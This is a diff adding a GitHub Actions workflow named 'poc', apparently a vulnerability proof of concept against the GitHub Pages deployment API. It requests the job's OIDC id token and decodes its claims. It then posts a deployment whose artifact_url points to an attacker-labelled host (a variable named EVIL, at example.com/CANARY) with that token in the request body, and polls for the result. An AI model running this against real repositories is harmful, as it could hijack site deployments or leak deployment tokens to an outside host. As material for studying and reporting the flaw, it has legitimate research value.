@@ -1,0 +1,49 @@
+name: poc
+on: workflow_dispatch
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+    steps:
+      - run: mkdir -p site && echo "<h1>CONTROL-ARTIFACT-ID</h1>" > site/index.html
+      - uses: actions/upload-pages-artifact@v3
+        with:
+          path: site
+      - name: collect ids
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          AID=$(curl -sS -H "Authorization: Bearer $GH_TOKEN" "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | jq -r '.artifacts[] | select(.name=="github-pages") | .id')
+          echo "artifact_id=$AID"
+          echo "AID=$AID" >> "$GITHUB_ENV"
+          IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "::add-mask::$IDT"
+          echo "IDT=$IDT" >> "$GITHUB_ENV"
+          echo "$IDT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{aud,sub,environment,ref}' || true
+      - name: TEST artifact_id + attacker-controlled artifact_url
+        env:
+          GH_TOKEN: ${{ github.token }}
+          EVIL: https://example.com/CANARY/_apis/pipelines/1/runs/1/artifacts
+        run: |
+          jq -nc --argjson aid "$AID" --arg url "$EVIL" --arg sha "$GITHUB_SHA" --arg t "$IDT" \
+            '{artifact_id:$aid, artifact_url:$url, pages_build_version:$sha, oidc_token:$t, environment:"github-pages"}' > body.json
+          jq '.oidc_token="<redacted>"' body.json
+          echo "--- POST /pages/deployments ---"
+          curl -sS -o resp.txt -w "HTTP %{http_code}\n" -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/pages/deployments" -d @body.json
+          cat resp.txt; echo
+      - name: poll deployment status
+        if: always()
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          for i in 1 2 3 4 5 6 7 8 9 10; do
+            sleep 10
+            echo "--- poll $i ---"
+            curl -sS -H "Authorization: Bearer $GH_TOKEN" "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/pages/deployments/$GITHUB_SHA"
+            echo
+          done
